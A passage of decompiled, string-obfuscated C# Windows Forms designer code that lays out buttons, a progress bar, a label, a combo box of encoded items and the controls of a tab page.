		((Control)button101).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CEA66 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb);
		((Control)button101).Size = new Size(115, 38);
		((Control)button101).TabIndex = 114;
		((Control)button101).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EA596 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((ButtonBase)button101).UseVisualStyleBackColor = false;
		((Control)button101).Click += button101_Click;
		((Control)button102).BackColor = Color.MediumOrchid;
		((Control)button102).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA0017 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button102).ForeColor = SystemColors.ControlLightLight;
		((Control)button102).Location = new Point(137, 503);
		((Control)button102).Margin = new Padding(5, 3, 5, 3);
		((Control)button102).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A50F4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		((Control)button102).Size = new Size(115, 38);
		((Control)button102).TabIndex = 113;
		((Control)button102).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FACDF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa);
		((ButtonBase)button102).UseVisualStyleBackColor = false;
		((Control)button102).Click += button102_Click;
		((Control)button103).BackColor = Color.FromArgb(0, 0, 64);
		((Control)button103).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DEA4B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782), 10f, (FontStyle)1);
		((Control)button103).ForeColor = SystemColors.ControlLightLight;
		((Control)button103).Location = new Point(939, 12);
		((Control)button103).Margin = new Padding(5, 3, 5, 3);
		((Control)button103).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCA80C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6);
		((Control)button103).Size = new Size(184, 38);
		((Control)button103).TabIndex = 112;
		((Control)button103).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DF979 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((ButtonBase)button103).UseVisualStyleBackColor = false;
		((Control)button103).Click += button103_Click;
		pictureBox36.BorderStyle = (BorderStyle)2;
		((Control)pictureBox36).Location = new Point(35, 127);
		((Control)pictureBox36).Margin = new Padding(5, 3, 5, 3);
		((Control)pictureBox36).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC739A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8);
		((Control)pictureBox36).Size = new Size(177, 239);
		pictureBox36.SizeMode = (PictureBoxSizeMode)1;
		pictureBox36.TabIndex = 105;
		pictureBox36.TabStop = false;
		((Control)pictureBox36).Click += pictureBox36_Click;
		((Control)button104).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button104).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12710B6C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2), 8f, (FontStyle)1);
		((Control)button104).ForeColor = SystemColors.ControlLightLight;
		((Control)button104).Location = new Point(157, 83);
		((Control)button104).Margin = new Padding(5, 3, 5, 3);
		((Control)button104).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8D7E8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e);
		((Control)button104).Size = new Size(60, 38);
		((Control)button104).TabIndex = 104;
		((Control)button104).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x605823C7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c);
		((ButtonBase)button104).UseVisualStyleBackColor = false;
		((Control)button104).Click += button104_Click;
		((Control)button105).BackColor = Color.Blue;
		((Control)button105).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A6392D1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button105).ForeColor = SystemColors.ControlLightLight;
		((Control)button105).Location = new Point(320, 12);
		((Control)button105).Margin = new Padding(5, 3, 5, 3);
		((Control)button105).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2A35B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc);
		((Control)button105).Size = new Size(107, 38);
		((Control)button105).TabIndex = 107;
		((Control)button105).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69461665 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f);
		((ButtonBase)button105).UseVisualStyleBackColor = false;
		((Control)button105).Click += button105_Click;
		((Control)progressBar5).Location = new Point(294, 503);
		((Control)progressBar5).Margin = new Padding(5, 3, 5, 3);
		((Control)progressBar5).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x137418E3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((Control)progressBar5).Size = new Size(919, 18);
		((Control)progressBar5).TabIndex = 108;
		((Control)label115).AutoSize = true;
		((Control)label115).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C407E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label115).ForeColor = SystemColors.ControlLightLight;
		((Control)label115).Location = new Point(31, 24);
		((Control)label115).Margin = new Padding(5, 0, 5, 0);
		((Control)label115).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEE404 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6);
		((Control)label115).Size = new Size(190, 19);
		((Control)label115).TabIndex = 111;
		((Control)label115).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD044710 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925);
		((Control)button106).BackColor = Color.Green;
		((Control)button106).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2B1CF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button106).ForeColor = SystemColors.ControlLightLight;
		((Control)button106).Location = new Point(640, 12);
		((Control)button106).Margin = new Padding(5, 3, 5, 3);
		((Control)button106).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F2CD5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a);
		((Control)button106).Size = new Size(110, 38);
		((Control)button106).TabIndex = 109;
		((Control)button106).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--328687871 ^ 0xC94AD32 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7);
		((ButtonBase)button106).UseVisualStyleBackColor = false;
		((Control)button106).Click += button106_Click;
		comboBox36.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox36).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC90A52 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a), 10f, (FontStyle)1);
		((ListControl)comboBox36).FormattingEnabled = true;
		comboBox36.Items.AddRange(new object[60]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C8B4C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F2CF9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA10C92 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC9989 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B39C4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128C30E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA31D9D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA1F0B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD0452B0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DFFD5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x26559D16 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x30029EFB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8D0A8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13741F07 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C296309 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_316b0d76d3564b3192cf4837ca11a51b),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F7F55 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEE3B0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2A902 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCAE30 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB2C77 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA14C5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1146229973 ^ 0x1D3EF907 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B77C27C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2d06329f1bd54c2287b4ec6435bc1344),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A570A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3DAB0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1831747487 ^ 0x4D8F2264 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x30029FED ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC91E0E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B3FA2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--328687871 ^ 0x6E567A07 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C1195A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F7E3F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEE28A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A638505 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AF113 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB2EA7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF880E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C8EA4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x26559F30 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A54B6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A11E09 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC9CC9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E1BC5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60582B19 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC9C8F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--863542085 ^ 0x71861469 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B3D24 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DD10D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1646586438 ^ -290123901 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F2813 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DFCFF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CEFB4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF89BA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC9DCF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2083794465 ^ -159930641 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C8F20 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB5611 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1160B298 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E92D5D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6CB0AA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823)
		});
		((Control)comboBox36).Location = new Point(14, 583);
		((Control)comboBox36).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox36).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BC928E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6);
		((Control)comboBox36).Size = new Size(220, 24);
		((Control)comboBox36).TabIndex = 110;
		comboBox36.SelectedIndexChanged += comboBox36_SelectedIndexChanged;
		((Control)tabPage4).BackColor = Color.FromArgb(16, 26, 40);
		((Control)tabPage4).Controls.Add((Control)(object)button33);
		((Control)tabPage4).Controls.Add((Control)(object)button34);
		((Control)tabPage4).Controls.Add((Control)(object)button35);
		((Control)tabPage4).Controls.Add((Control)(object)pictureBox11);
		((Control)tabPage4).Controls.Add((Control)(object)pictureBox12);
		((Control)tabPage4).Controls.Add((Control)(object)button36);
		((Control)tabPage4).Controls.Add((Control)(object)button37);
		((Control)tabPage4).Controls.Add((Control)(object)button38);
		((Control)tabPage4).Controls.Add((Control)(object)button39);
		((Control)tabPage4).Controls.Add((Control)(object)checkBox9);
		((Control)tabPage4).Controls.Add((Control)(object)checkBox10);
		((Control)tabPage4).Controls.Add((Control)(object)button40);
		((Control)tabPage4).Controls.Add((Control)(object)button41);
		((Control)tabPage4).Controls.Add((Control)(object)button42);
		((Control)tabPage4).Controls.Add((Control)(object)button43);
		((Control)tabPage4).Controls.Add((Control)(object)button44);
		((Control)tabPage4).Controls.Add((Control)(object)button45);
		((Control)tabPage4).Controls.Add((Control)(object)button46);
		((Control)tabPage4).Controls.Add((Control)(object)button47);
		((Control)tabPage4).Controls.Add((Control)(object)comboBox11);
		((Control)tabPage4).Controls.Add((Control)(object)textBox22);
		((Control)tabPage4).Controls.Add((Control)(object)label41);
		((Control)tabPage4).Controls.Add((Control)(object)textBox23);
		((Control)tabPage4).Controls.Add((Control)(object)textBox24);
		((Control)tabPage4).Controls.Add((Control)(object)textBox25);
		((Control)tabPage4).Controls.Add((Control)(object)label42);
		((Control)tabPage4).Controls.Add((Control)(object)label43);
		((Control)tabPage4).Controls.Add((Control)(object)label44);
		((Control)tabPage4).Controls.Add((Control)(object)label45);
		((Control)tabPage4).Controls.Add((Control)(object)label46);
		((Control)tabPage4).Controls.Add((Control)(object)textBox26);
		((Control)tabPage4).Controls.Add((Control)(object)textBox27);
		((Control)tabPage4).Controls.Add((Control)(object)textBox28);
		((Control)tabPage4).Controls.Add((Control)(object)label47);
		((Control)tabPage4).Controls.Add((Control)(object)textBox29);
		((Control)tabPage4).Controls.Add((Control)(object)textBox30);
		((Control)tabPage4).Controls.Add((Control)(object)textBox31);
		((Control)tabPage4).Controls.Add((Control)(object)label48);
		((Control)tabPage4).Controls.Add((Control)(object)label49);
		((Control)tabPage4).Controls.Add((Control)(object)label50);
